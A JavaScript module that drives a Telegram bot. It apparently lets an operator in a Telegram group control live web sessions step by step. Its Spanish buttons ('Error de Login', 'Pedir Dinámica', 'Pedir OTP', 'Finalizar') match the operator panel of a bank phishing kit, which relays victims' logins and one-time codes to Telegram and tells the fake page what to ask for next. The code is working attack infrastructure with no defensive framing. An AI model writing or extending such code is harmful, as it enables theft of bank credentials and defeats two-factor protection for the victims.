import { buildMessageText, activeSessions, decisionMap  } from "../controllers/botController.js";


const pendingDecisions = new Map();

export function waitForDecision(decisionId, step = 1) {
  return new Promise((resolve, reject) => {
    if (pendingDecisions.has(decisionId)) {
      pendingDecisions.delete(decisionId);
    }
      pendingDecisions.set(decisionId, { resolve, reject, step });
  });
}

export function removePending(decisionId) {
  pendingDecisions.delete(decisionId); 
}

export const sendTelegramAlert = async ({
  groupId,
  text,
  decisionId,
}) => {
  let buttons = [];
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const telegramApi = `https://api.telegram.org/bot${token}/sendMessage`;
  const socketId = decisionMap.get(decisionId);
  const session = activeSessions.get(socketId);
  const step = session.step || 1;
  if (step === 1) {
    buttons = [
      [
        { text: "Continuar", callback_data: `continue:${decisionId}` },
        { text: "Error de Login", callback_data: `errorLogin:${decisionId}` },
      ],
    ];
  } else if (step === 2) {
    buttons = [
      [
        {
          text: "Pedir Dinámica",
          callback_data: `requestDinamica:${decisionId}`,
        },
        { text: "Pedir OTP", callback_data: `requestOtp:${decisionId}` },
        { text: "Finalizar", callback_data: `finalize:${decisionId}` },
      ],
    ];
  }
  const response = await fetch(telegramApi, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: groupId,
      text,
      reply_markup: {
        inline_keyboard: buttons
      },
    }),
  });

  const result = await response.json();
  if (!result.ok) {
    console.error("Telegram error:", result);
    return { message_id: null };
  }

  return {
    message_id: result.result.message_id,
    decisionId,
  };
};

export async function respondToTelegramCallback(callback) {
  const [action, decisionId] = callback.data.split(":");
  const socketId = decisionMap.get(decisionId);
  const session = activeSessions.get(socketId);
  if (!session) return;

  let newText = session.messageText; // Debe almacenarse en la sesión
  let newStep = session.step;

  if (pendingDecisions.has(decisionId)) {
    const { resolve, step } = pendingDecisions.get(decisionId);
    
    if (step === 1 && action === "continue") {
      // Etapa 1 → Etapa 2
      newStep = 2;
      newText = buildMessageText(session, step);
      
      // Actualiza botones a "Error Datos"
      await editTelegramMessage({
        chatId: session.chatId,
        messageId: session.messageId,
        text: newText,
        reply_markup: {
          inline_keyboard: [[
            { text: 'Continuar', callback_data: `continue:${decisionId}` },
            { text: 'Error Datos', callback_data: `errorData:${decisionId}` },
          ]]
        },
      });
    } 
    else if (step === 2 && ["requestDinamica", "requestOtp"].includes(action)) {
      // Etapa 2 → Etapa 3
      newStep = 3;
      newText = buildMessageText(session, step);
      
      // Actualiza botones a "Error Dinámica" y "Error OTP"
      await editTelegramMessage({
        chatId: session.chatId,
        messageId: session.messageId,
        text: newText,
        reply_markup: {
          inline_keyboard: [[
            { text: 'Error Dinámica', callback_data: `errorDinamica:${decisionId}` },
            { text: 'Error OTP', callback_data: `errorOtp:${decisionId}` },
            { text: 'Finalizar', callback_data: `finalize:${decisionId}` },
          ]]
        },
      });
    }

    // Resuelve la promesa y actualiza la sesión
    if (pendingDecisions.has(decisionId)) {
      pendingDecisions.get(decisionId).resolve(action);
      session.step = newStep;
      session.messageText = newText;
      pendingDecisions.delete(decisionId);
    }
  }

  /* await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      callback_query_id: callback.id,
      text: `Has seleccionado: ${decision}`,
      show_alert: false,
    }),
  });

  if (pendingDecisions.has(decisionId)) {
    const { resolve } = pendingDecisions.get(decisionId);
    resolve(decision);
    pendingDecisions.delete(decisionId);
  } */
}

export const sendSimpleTelegramMessage = async (chatId, text) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text }),
  });

  const data = await res.json();
  return data.result;
};

export const editTelegramMessage = async ({
  chatId,
  messageId,
  text,
  reply_markup,
}) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;

  const payload = {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: "HTML",
  };

  if (reply_markup) {
    payload.reply_markup = reply_markup;
  }

  const response = await fetch(
    `https://api.telegram.org/bot${token}/editMessageText`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    }
  );

  const result = await response.json();
  return result.result;
};
